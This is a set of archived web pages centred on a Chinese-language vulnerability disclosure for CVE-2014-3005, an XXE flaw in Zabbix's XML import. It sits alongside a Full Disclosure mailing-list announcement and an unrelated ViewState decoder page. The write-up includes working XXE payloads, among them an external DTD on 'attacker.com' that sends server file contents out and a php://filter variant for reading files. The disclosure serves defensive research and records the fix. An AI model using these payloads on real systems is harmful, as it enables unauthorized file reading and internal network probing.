=== Content from web.archive.org_6148c463_20250126_110517.html ===


[Ask the publishers](https://change.org/LetReadersRead) to restore access to 500,000+ books.

Hamburger icon
An icon used to represent a menu that can be toggled by interacting with this icon.

[Internet Archive logo
A line drawing of the Internet Archive headquarters building faÃ§ade.](https://archive.org/ "Go home")

[Web icon
An illustration of a computer application window

Wayback Machine](https://web.archive.org "Expand web menu")

[Texts icon
An illustration of an open book.

Texts](https://archive.org/details/texts "Expand texts menu")

[Video icon
An illustration of two cells of a film strip.

Video](https://archive.org/details/movies "Expand video menu")

[Audio icon
An illustration of an audio speaker.

Audio](https://archive.org/details/audio "Expand audio menu")

[Software icon
An illustration of a 3.5" floppy disk.

Software](https://archive.org/details/software "Expand software menu")

[Images icon
An illustration of two photographs.

Images](https://archive.org/details/image "Expand images menu")

[Donate icon
An illustration of a heart shape

Donate](https://archive.org/donate/ "Expand donate menu")

[Ellipses icon
An illustration of text ellipses.

More](https://archive.org/about/ "Expand more menu")

[Donate icon
An illustration of a heart shape

"Donate to the archive"](https://archive.org/donate/?origin=iawww-mbhrt)

User icon
An illustration of a person's head and chest.
[Sign up](https://archive.org/account/signup)
|
[Log in](https://archive.org/account/login)

[Upload icon
An illustration of a horizontal line over an up pointing arrow.

Upload](https://archive.org/create)

Search icon
An illustration of a magnifying glass.

Search icon
An illustration of a magnifying glass.

### Internet Archive Audio

[![](https://archive.org/services/img/etree)Live Music Archive](https://archive.org/details/etree)

[![](https://archive.org/services/img/librivoxaudio)Librivox Free Audio](https://archive.org/details/librivoxaudio)

#### Featured

* [All Audio](https://archive.org/details/audio)
* [Grateful Dead](https://archive.org/details/GratefulDead)
* [Netlabels](https://archive.org/details/netlabels)
* [Old Time Radio](https://archive.org/details/oldtimeradio)
* [78 RPMs and Cylinder Recordings](https://archive.org/details/78rpm)

#### Top

* [Audio Books & Poetry](https://archive.org/details/audio_bookspoetry)
* [Computers, Technology and Science](https://archive.org/details/audio_tech)
* [Music, Arts & Culture](https://archive.org/details/audio_music)
* [News & Public Affairs](https://archive.org/details/audio_news)
* [Spirituality & Religion](https://archive.org/details/audio_religion)
* [Podcasts](https://archive.org/details/podcasts)
* [Radio News Archive](https://archive.org/details/radio)

### Images

[![](https://archive.org/services/img/metropolitanmuseumofart-gallery)Metropolitan Museum](https://archive.org/details/metropolitanmuseumofart-gallery)

[![](https://archive.org/services/img/clevelandart)Cleveland Museum of Art](https://archive.org/details/clevelandart)

#### Featured

* [All Images](https://archive.org/details/image)
* [Flickr Commons](https://archive.org/details/flickrcommons)
* [Occupy Wall Street Flickr](https://archive.org/details/flickr-ows)
* [Cover Art](https://archive.org/details/coverartarchive)
* [USGS Maps](https://archive.org/details/maps_usgs)

#### Top

* [NASA Images](https://archive.org/details/nasa)
* [Solar System Collection](https://archive.org/details/solarsystemcollection)
* [Ames Research Center](https://archive.org/details/amesresearchcenterimagelibrary)

### Software

[![](https://archive.org/services/img/internetarcade)Internet Arcade](https://archive.org/details/internetarcade)

[![](https://archive.org/services/img/consolelivingroom)Console Living Room](https://archive.org/details/consolelivingroom)

#### Featured

* [All Software](https://archive.org/details/software)
* [Old School Emulation](https://archive.org/details/tosec)
* [MS-DOS Games](https://archive.org/details/softwarelibrary_msdos_games)
* [Historical Software](https://archive.org/details/historicalsoftware)
* [Classic PC Games](https://archive.org/details/classicpcgames)
* [Software Library](https://archive.org/details/softwarelibrary)

#### Top

* [Kodi Archive and Support File](https://archive.org/details/kodi_archive)
* [Vintage Software](https://archive.org/details/vintagesoftware)
* [APK](https://archive.org/details/apkarchive)
* [MS-DOS](https://archive.org/details/softwarelibrary_msdos)
* [CD-ROM Software](https://archive.org/details/cd-roms)
* [CD-ROM Software Library](https://archive.org/details/cdromsoftware)
* [Software Sites](https://archive.org/details/softwaresites)
* [Tucows Software Library](https://archive.org/details/tucows)
* [Shareware CD-ROMs](https://archive.org/details/cdbbsarchive)
* [Software Capsules Compilation](https://archive.org/details/softwarecapsules)
* [CD-ROM Images](https://archive.org/details/cdromimages)
* [ZX Spectrum](https://archive.org/details/softwarelibrary_zx_spectrum)
* [DOOM Level CD](https://archive.org/details/doom-cds)

### Texts

[![](https://archive.org/images/widgetOL.png)Open Library](https://openlibrary.org/)

[![](https://archive.org/services/img/americana)American Libraries](https://archive.org/details/americana)

#### Featured

* [All Texts](https://archive.org/details/texts)
* [Smithsonian Libraries](https://archive.org/details/smithsonian)
* [FEDLINK (US)](https://archive.org/details/fedlink)
* [Genealogy](https://archive.org/details/genealogy)
* [Lincoln Collection](https://archive.org/details/lincolncollection)

#### Top

* [American Libraries](https://archive.org/details/americana)
* [Canadian Libraries](https://archive.org/details/toronto)
* [Universal Library](https://archive.org/details/universallibrary)
* [Project Gutenberg](https://archive.org/details/gutenberg)
* [Children's Library](https://archive.org/details/iacl)
* [Biodiversity Heritage Library](https://archive.org/details/biodiversity)
* [Books by Language](https://archive.org/details/booksbylanguage)
* [Additional Collections](https://archive.org/details/additional_collections)

### Video

[![](https://archive.org/services/img/tv)TV News](https://archive.org/details/tv)

[![](https://archive.org/services/img/911)Understanding 9/11](https://archive.org/details/911)

#### Featured

* [All Video](https://archive.org/details/movies)
* [Prelinger Archives](https://archive.org/details/prelinger)
* [Democracy Now!](https://archive.org/details/democracy_now_vid)
* [Occupy Wall Street](https://archive.org/details/occupywallstreet)
* [TV NSA Clip Library](https://archive.org/details/nsa)

#### Top

* [Animation & Cartoons](https://archive.org/details/animationandcartoons)
* [Arts & Music](https://archive.org/details/artsandmusicvideos)
* [Computers & Technology](https://archive.org/details/computersandtechvideos)
* [Cultural & Academic Films](https://archive.org/details/culturalandacademicfilms)
* [Ephemeral Films](https://archive.org/details/ephemera)
* [Movies](https://archive.org/details/moviesandfilms)
* [News & Public Affairs](https://archive.org/details/newsandpublicaffairs)
* [Spirituality & Religion](https://archive.org/details/spiritualityandreligion)
* [Sports Videos](https://archive.org/details/sports)
* [Television](https://archive.org/details/television)
* [Videogame Videos](https://archive.org/details/gamevideos)
* [Vlogs](https://archive.org/details/vlogs)
* [Youth Media](https://archive.org/details/youth_media)

Search the history of over 916 billion
[web pages](https://blog.archive.org/2016/10/23/defining-web-pages-web-sites-and-web-captures/)
on the Internet.

Search the Wayback Machine

Search icon
An illustration of a magnifying glass.

#### Mobile Apps

* [Wayback Machine (iOS)](https://apps.apple.com/us/app/wayback-machine/id1201888313)
* [Wayback Machine (Android)](https://play.google.com/store/apps/details?id=com.archive.waybackmachine&hl=en_US)

#### Browser Extensions

* [Chrome](https://chrome.google.com/webstore/detail/wayback-machine/fpnmgdkabkmnadcjpehmlllkndpkmiak)
* [Firefox](https://addons.mozilla.org/en-US/firefox/addon/wayback-machine_new/)
* [Safari](https://apps.apple.com/us/app/wayback-machine/id1472432422?mt=12)
* [Edge](https://microsoftedge.microsoft.com/addons/detail/wayback-machine/kjmickeoogghaimmomagaghnogelpcpn?hl=en-US)

#### Archive-It Subscription

* [Explore the Collections](https://www.archive-it.org/explore)
* [Learn More](https://www.archive-it.org/blog/learn-more/)
* [Build Collections](https://www.archive-it.org/contact-us)

### Save Page Now

Capture a web page as it appears now for use as a trusted citation in the future.

Please enter a valid web address

* [About](https://archive.org/about/)
* [Blog](https://blog.archive.org)
* [Projects](https://archive.org/projects/)
* [Help](https://archive.org/about/faqs.php)
* [Donate](https://archive.org/donate?origin=iawww-TopNavDonateButton)
* [Contact](https://archive.org/about/contact)
* [Jobs](https://archive.org/about/jobs)
* [Volunteer](https://archive.org/about/volunteer-positions)
* [People](https://archive.org/about/bios)

* [Sign up for free](https://archive.org/account/signup)
* [Log in](https://archive.org/account/login)

Search metadata

Search text contents

Search TV news captions

Search radio transcripts

Search archived web sites

[Advanced Search](https://archive.org/advancedsearch.php)

* [About](https://archive.org/about/)
* [Blog](https://blog.archive.org)
* [Projects](https://archive.org/projects/)
* [Help](https://archive.org/about/faqs.php)
* [Donate
  Donate icon
  An illustration of a heart shape](https://archive.org/donate?origin=iawww-TopNavDonateButton)
* [Contact](https://archive.org/about/contact)
* [Jobs](https://archive.org/about/jobs)
* [Volunteer](https://archive.org/about/volunteer-positions)
* [People](https://archive.org/about/bios)

The Wayback Machine requires your browser to support JavaScript, please email info@archive.org
if you have any questions about this.

The Wayback Machine is an initiative of the
[Internet Archive](//archive.org/),
a 501(c)(3) non-profit, building a digital library of
Internet sites and other cultural artifacts in digital form.

Other [projects](//archive.org/projects/) include
[Open Library](https://openlibrary.org/) &
[archive-it.org](https://archive-it.org).

Your use of the Wayback Machine is subject to the Internet Archive's
[Terms of Use](//archive.org/about/terms.php).



=== Content from web.archive.org_b0b45248_20250125_183651.html ===


[![Wayback Machine](https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png)](/web/ "Wayback Machine home page")

[11 captures](/web/20140622034155%2A/http%3A//www.pnigos.com/?p=273 "See a list of every capture for this URL")
22 Jun 2014 - 18 Jul 2024

| May | JUN | [**Sep**](https://web.archive.org/web/20140917004652/http%3A//www.pnigos.com%3A80/?p=273 "17 Sep 2014") |
| Previous capture | 22 | [Next capture](https://web.archive.org/web/20140917004652/http%3A//www.pnigos.com%3A80/?p=273 "00:46:52 Sep 17, 2014") |
| 2013 | 2014 | [**2015**](https://web.archive.org/web/20150820194335/http%3A//www.pnigos.com/?p=273 "20 Aug 2015") |

success
fail

 [About this capture](#expand)

COLLECTED BY

Organization: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

Collection: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

TIMESTAMPS

![loading](https://web-static.archive.org/_static/images/loading.gif)

The Wayback Machine - https://web.archive.org/web/20140622034155/http://www.pnigos.com:80/?p=273

# [风井](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/ "风井")

## Know me then ignore me

### 菜单

[跳至内容](#content "跳至内容")

* [首页](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/)
* [About:Me](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?page_id=7)
* [Papers](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?page_id=2)
* [FreeBuf](https://web.archive.org/web/20140622034155/http%3A//www.freebuf.com/)
* [VulBox](https://web.archive.org/web/20140622034155/https%3A//vulbox.com/)

# [CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack

[1条回复](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273#comments "《[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack》上的评论")

**0×01，背景：**

zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。

**0×02，漏洞说明：**

zabbix提供灵活的针对各项配置的导入/导出机制，支持XML的数据格式。后端在对导入的xml数据进行处理时，解析了外部实体，导致攻击者可以构造恶意的xml文件，读取zabbix服务器本地文件内容或以服务器为代理发起网络请求，扫描端口，探测内网。

**影响版本：**1.8.x-2.2（当前最新版）

**Found by：**pnig0s

**0×03，漏洞分析：**

问题代码存在于include/classes/import/CXmlImport18.php，395行：

```
public static function import($file) {
libxml_use_internal_errors(true);

$xml = new DOMDocument();
if (!$xml->loadXML($file)) {
    $text = '';
    foreach (libxml_get_errors() as $error) {
        switch ($error->level) {
            case LIBXML_ERR_WARNING:
                $text .= _('XML file contains errors').'. Warning '.$error->code.': ';
                break;
            case LIBXML_ERR_ERROR:
                $text .= _('XML file contains errors').'. Error '.$error->code.': ';
                break;
            case LIBXML_ERR_FATAL:
                $text .= _('XML file contains errors').'. Fatal Error '.$error->code.': ';
                break;
        }

        $text .= trim($error->message).' [ Line: '.$error->line.' | Column: '.$error->column.' ]';
        break;
    }
    libxml_clear_errors();

    throw new Exception($text);
}
```

代码首先初始化了DOMDocument对象，然后调用loadXML函数对导入的XML文件进行解析。DOMDocument，SimpleXML和XMLReader是PHP中三种最常用的处理XML的方式，这三种方式默认都支持对外部实体的解析，而这段代码中也没有明确禁止对外部实体的解析。

我们创建一个符合zabbix要求的xml文件，并在起始处声明外部实体。

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY file SYSTEM "file:///etc/hosts">
]>
<zabbix_export>&file;</zabbix_export>
```

进入Configuration->Hosts->Import，并导入，发现回显报错，但不是预期的文件内容。

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/6631398426709.PNG "directly_error.PNG")

跟到报错信息所指的文件中，include/classes/import/CXmlImport18.php，第425行

```
if ($xml->childNodes->item(0)->nodeName != 'zabbix_export') {
    $xml2 = self::createDOMDocument();
    $xml2->appendChild($xml2->ownerDocument->importNode($xml->childNodes->item(0), true));
    self::$xml = $xml2->ownerDocument;
}
else {
    self::$xml = $xml;
}
```

代码判断了子节点的第一个结点是否为zabbix\_export，若不是则创建一个新的xml DOM文档并将之前的第一个结点复制到新的DOM文档中使用。而我们构造的xml文件的第一个结点是<!DOCTYPE xxx []>，文档类型的声明不符合一般结点的规范，因此在导入时报错。逻辑中断在这里不会继续执行，无法达到我们的目的。而文档类型的声明又必须紧邻xml头的声明，我们也不能调整DOCTYPE声明的位置。

看似这个问题变得鸡肋了，不过可以使用一些tricks，曲线救国，达到我们的目的。

这里使用<!ENTITY % xxx “”>的参数实体形式在loadXML阶段主动构造出一个报错，把我们想要获取的信息爆出来同时可以发送到攻击者的服务器。参数实体不同与通用实体，仅能在实体声明内部使用。

首先在攻击者的服务器attacker.com中建立ext.dtd，内容为：

```
<!ENTITY % all
 "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?%file;'>"
>
%all;
```

将要导入的xml文件修改为：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd">
%dtd;
%send;
]]>
<zabbix_export>
</zabbix_export>
```

将该文件导入，返回结果如下

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/77481398426709.PNG "redirect_plaintext_error.PNG")

很好很强大，爆出了服务器的hosts文件内容。但是这里还有一个小问题，有些文件过长或包含特殊的符号，会截断我们特意构造的参数实体声明，导致文件内容读取不完整。不过好在万能的php提供了php://filter/read=convert.base64-encode/resource这一wrapper，可以以base64的编码形式读取任意文件。

于是将要导入的xml文件修改为：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts">
 <!ENTITY % dtd SYSTEM "http://attacker.com/ext.dtd">
%dtd;
%send;
]]>
<zabbix_export>
</zabbix_export>
```

查看远端Web访问日志：

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/65091398426709.PNG "1.PNG")

解码base64：

![](https://web.archive.org/web/20140622034155im_/http://www.pnigos.com/wp-content/plugins/wp-ueditor/ueditor/php/upload/32991398426709.PNG "burp_decode_hosts.PNG")

**0×04，漏洞影响：**

1. 本地任意文件读取
2. 端口扫描
3. 内网探测

**0×05，修复建议：**

禁止对外部实体的解析。

**0×06，披露过程：**

04/24/2014 —— 发现漏洞

04/25/2014 —— 提交Zabbix官方（[https://support.zabbix.com/browse/ZBX-8151](https://web.archive.org/web/20140622034155/https%3A//support.zabbix.com/browse/ZBX-8151)）

04/27/2014 —— MITRE分配CVE-ID：CVE-2014-3005

06/17/2014 —— Fix Released

svn://svn.zabbix.com/branches/dev/ZBX-8151-18 r46594 for 1.8

svn://svn.zabbix.com/branches/dev/ZBX-8151-20 r46600 for 2.0+

本条目发布于[2014 年 6 月 17 日](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273 "下午 10:57")。属于[代码审计[Code Audit]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=73 "查看代码审计[Code Audit]中的全部文章")、[漏洞挖掘[Vulnerability]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=110 "查看漏洞挖掘[Vulnerability]中的全部文章")分类，被贴了 [xxe attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=xxe-attack)、[xxe漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=xxe%e6%bc%8f%e6%b4%9e)、[zabbix漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=zabbix%e6%bc%8f%e6%b4%9e)、[外部实体攻击](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?tag=%e5%a4%96%e9%83%a8%e5%ae%9e%e4%bd%93%e6%94%bb%e5%87%bb) 标签。作者是[pnig0s|小P](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?author=1 "查看所有由pnig0s|小P发布的文章")。

### 文章导航

[← Flash跨域数据劫持漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=310)
[[CVE-2014-3244]SugarCRM v6.5.1 rss dashlet LFI via XXE Attack →](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=294)

## 《[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack》上有1条评论

1. Pingback引用通告： [Zabbix XML外部实体注入漏洞(CVE-2014-3005) | 国联天成](https://web.archive.org/web/20140622034155/http%3A//www.gltc.cn/43012.html)

### 发表评论 [取消回复](/web/20140622034155/http%3A//www.pnigos.com/?p=273#respond)

电子邮件地址不会被公开。 必填项已用\*标注

姓名 \*

电子邮件 \*

站点

评论

您可以使用这些HTML标签和属性： `<a href="" title=""> <abbr title=""> <acronym title=""> <b> <blockquote cite=""> <cite> <code> <del datetime=""> <em> <i> <q cite=""> <strike> <strong>`

### 近期文章

* [[CVE-2014-3244]SugarCRM v6.5.1 rss dashlet LFI via XXE Attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=294)
* [[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273)
* [Flash跨域数据劫持漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=310)
* [[CVE-2014-3242,3243]SOAPpy 0.12.5 Multiple Vulnerabilities](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=260)
* [Write-up:Digg.com stored xss](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=245)
### 分类目录

* [代码审计[Code Audit]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=73 "查看代码审计[Code Audit]下的所有文章") (4)
* [前端黑客[WebH4cking]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=4 "web hacking") (9)
* [唧唧歪歪[Gossip]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=5 "Gossip") (2)
* [机器学习[Make Love]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=88 "查看机器学习[Make Love]下的所有文章") (1)
* [渗透测试[Pentest]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=2 "H4cking") (2)
* [漏洞挖掘[Vulnerability]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=110 "查看漏洞挖掘[Vulnerability]下的所有文章") (9)
* [系统编程[SysCoding]](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?cat=3 "coding") (5)
### 文章归档

* [2014年六月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201406)
* [2014年五月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201405)
* [2014年四月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201404)
* [2014年三月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201403)
* [2014年二月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201402)
* [2013年十二月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201312)
* [2013年十一月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201311)
* [2013年五月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201305)
* [2013年四月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201304)
* [2013年二月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201302)
* [2013年一月](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?m=201301)
### Dig Security

[Browser Security](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/browsersec/wiki/Main)

[DOMXSS Wiki](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/domxsswiki/)

[SQLI Wiki](https://web.archive.org/web/20140622034155/http%3A//websec.ca/kb/sql_injection)

[Ruby Security](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/ruby-security/wiki/Guide)

[全球安全会议归档](https://web.archive.org/web/20140622034155/http%3A//archive.liquidmatrix.org/)

[渗透测试书签List](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/pentest-bookmarks/wiki/BookmarksList)

[HTML5Sec](https://web.archive.org/web/20140622034155/http%3A//html5sec.org/)

[Router Hacking](https://web.archive.org/web/20140622034155/http%3A//routerpwn.com/)

[Exploit Search](https://web.archive.org/web/20140622034155/http%3A//exploitsearch.net/)

[安全内容搜索](https://web.archive.org/web/20140622034155/http%3A//yehg.net/lab/pr0js/misc/wsa.php)

[Browser Security](https://web.archive.org/web/20140622034155/https%3A//code.google.com/p/browsersec)

[XssVec Collection](https://web.archive.org/web/20140622034155/http%3A//84692bb0df6f30fc0687-25dde2f20b8e8c1bda75aeb96f737eae.r66.cf1.rackcdn.com/xss.html)

### Tool Box

[JS Beautifier](https://web.archive.org/web/20140622034155/http%3A//jsbeautifier.org/)

[Run JS](https://web.archive.org/web/20140622034155/http%3A//runjs.cn/)

[sitedossier](https://web.archive.org/web/20140622034155/http%3A//www.sitedossier.com/)

[Code encoder&encrypter](https://web.archive.org/web/20140622034155/http%3A//yehg.net/encoding/)

[XSS'OR](https://web.archive.org/web/20140622034155/http%3A//evilcos.me/lab/xssor/)

[ViewState Decoder](https://web.archive.org/web/20140622034155/http%3A//ignatu.co.uk/ViewStateDecoder.aspx)

### 近期评论

* [Zabbix XML外部实体注入漏洞(CVE-2014-3005) | 国联天成](https://web.archive.org/web/20140622034155/http%3A//www.gltc.cn/43012.html)发表在《[[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=273#comment-1857)》
* ttt发表在《[Flash跨域数据劫持漏洞](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=310#comment-829)》
* [白小黑](https://web.archive.org/web/20140622034155/http%3A//www.baixiaohei.com/)发表在《[About:Me](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?page_id=7#comment-538)》
* pnig0s|小P发表在《[Vulcan:基于gevent和多线程模型的WebKit动态爬虫](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=217#comment-484)》
* livers发表在《[Vulcan:基于gevent和多线程模型的WebKit动态爬虫](https://web.archive.org/web/20140622034155/http%3A//www.pnigos.com/?p=217#comment-482)》

[自豪地采用WordPress](https://web.archive.org/web/20140622034155/http%3A//cn.wordpress.org/ "优雅的个人发布平台")



=== Content from web.archive.org_8bef53aa_20250126_110515.html ===


[![Wayback Machine](https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png)](/web/ "Wayback Machine home page")

[84 captures](/web/20140619123924%2A/http%3A//ignatu.co.uk/ViewStateDecoder.aspx "See a list of every capture for this URL")
19 Aug 2010 - 21 Feb 2016

| [**Apr**](https://web.archive.org/web/20140419015839/http%3A//ignatu.co.uk%3A80/ViewStateDecoder.aspx "19 Apr 2014") | JUN | [**Aug**](https://web.archive.org/web/20140810110638/http%3A//ignatu.co.uk%3A80/ViewStateDecoder.aspx "10 Aug 2014") |
| [Previous capture](https://web.archive.org/web/20140519204918/http%3A//ignatu.co.uk%3A80/ViewStateDecoder.aspx "20:49:18 May 19, 2014") | 19 | [Next capture](https://web.archive.org/web/20140713190630/http%3A//ignatu.co.uk/ViewStateDecoder.aspx "19:06:30 Jul 13, 2014") |
| [**2013**](https://web.archive.org/web/20130605050059/http%3A//ignatu.co.uk/ViewStateDecoder.aspx "05 Jun 2013") | 2014 | [**2016**](https://web.archive.org/web/20160112211737/http%3A//ignatu.co.uk/ViewStateDecoder.aspx "12 Jan 2016") |

success
fail

 [About this capture](#expand)

COLLECTED BY

Organization: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

Collection: [Alexa Crawls](https://archive.org/details/alexacrawls)

Starting in 1996, [Alexa Internet](http://www.alexa.com/) has been donating their crawl data to the Internet Archive. Flowing in every day, these data are added to the [Wayback Machine](http://web.archive.org/) after an embargo period.

TIMESTAMPS

![loading](https://web-static.archive.org/_static/images/loading.gif)

The Wayback Machine - https://web.archive.org/web/20140619123924/http://ignatu.co.uk:80/ViewStateDecoder.aspx

* [Home](/web/20140619123924/http%3A//ignatu.co.uk/Default.aspx)
* [Articles](/web/20140619123924/http%3A//ignatu.co.uk/Articles.aspx)
* [View State decoder](/web/20140619123924/http%3A//ignatu.co.uk/ViewStateDecoder.aspx)
* [About me](/web/20140619123924/http%3A//ignatu.co.uk/AboutMe.aspx)
* [Contact me](/web/20140619123924/http%3A//ignatu.co.uk/ContactMe.aspx)

# View State decoder

A free, online, [View State](https://web.archive.org/web/20140619123924/http%3A//msdn.microsoft.com/en-us/library/ms972976.aspx) decoder. Copy and paste your [Base64 encoded](https://web.archive.org/web/20140619123924/http%3A//en.wikipedia.org/wiki/Base64) View State (or the entire View State input tag) into the input box and click Decode. N.B. This tool cannot decode an encrypted View State.

## Input

| Encoded View State:(Base64 string or entire input tag) |  |
| --- | --- |
| Decode as: | Strings only  Complete object hierarchy |

Copyright © 2014 — ignatu.co.uk



=== Content from seclists.org_d1e1b7d8_20250125_183646.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](86)
[By Date](date.html#87)
[![Next](/images/right-icon-16x16.png)](88)

[![Previous](/images/left-icon-16x16.png)](86)
[By Thread](index.html#87)
[![Next](/images/right-icon-16x16.png)](88)

![](/shared/images/nst-icons.svg#search)

# [CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack

---

*From*: pnig0spnig0s <pnigos () live com>

*Date*: Tue, 17 Jun 2014 15:12:38 +0000

---

```
Product name:Zabbix
Description:Zabbix is an enterprise-class open source distributed monitoring solution for networks and applications.
Version affected:1.8.x-2.2.x
Type:XML External Entity Attack
Consequence:Arbitrary Local File Read&Potential RCE
Vulnerability Details:<http://www.pnigos.com/?p=273>
Fix Released:svn://svn.zabbix.com/branches/dev/ZBX-8151-18 r46594 for 1.8svn://svn.zabbix.com/branches/dev/ZBX-8151-20
r46600 for 2.0+
Bug was found by pnig0s @ FreeBuf.Com
==================================================
Best Regards,pnig0s

_______________________________________________
Sent through the Full Disclosure mailing list
<http://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](86)
[By Date](date.html#87)
[![Next](/images/right-icon-16x16.png)](88)

[![Previous](/images/left-icon-16x16.png)](86)
[By Thread](index.html#87)
[![Next](/images/right-icon-16x16.png)](88)

### Current thread:

* **[CVE-2014-3005]Zabbix 1.8.x-2.2.x Local File Inclusion via XXE Attack** *pnig0spnig0s (Jun 17)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

